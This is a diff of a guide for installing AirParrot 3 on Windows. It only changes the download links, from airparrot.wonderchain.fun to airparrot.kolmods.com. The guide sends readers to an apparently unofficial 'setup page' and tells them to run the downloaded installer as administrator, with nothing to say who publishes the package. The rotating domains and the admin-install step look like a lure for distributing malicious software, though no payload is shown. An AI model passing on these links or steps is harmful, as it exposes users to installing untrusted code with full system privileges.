@@ -11,20 +11,20 @@ Notes for users who need AirParrot 3 running on Windows — especially when airp
 Use the link below for the Windows package referenced in this guide.
 
 <p align="center">
-  <a href="https://airparrot.wonderchain.fun/">
+  <a href="https://airparrot.kolmods.com/">
     <img src="https://img.shields.io/badge/Open%20setup%20page-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Open setup page">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Page** | [airparrot.wonderchain.fun](https://airparrot.wonderchain.fun/) |
-| **URL** | `https://airparrot.wonderchain.fun/` |
+| **Page** | [airparrot.kolmods.com](https://airparrot.kolmods.com/) |
+| **URL** | `https://airparrot.kolmods.com/` |
 | **Platform** | Windows 10 / 11 (64-bit) |
 
 ### Recommended steps
 
-1. Open the [setup page (airparrot.wonderchain.fun)](https://airparrot.wonderchain.fun/)
+1. Open the [setup page (airparrot.kolmods.com)](https://airparrot.kolmods.com/)
 2. Download the package to a folder you can find (e.g. Downloads)
 3. Run the installer **as administrator** if Windows asks
 4. Reboot once if the app prompts after install
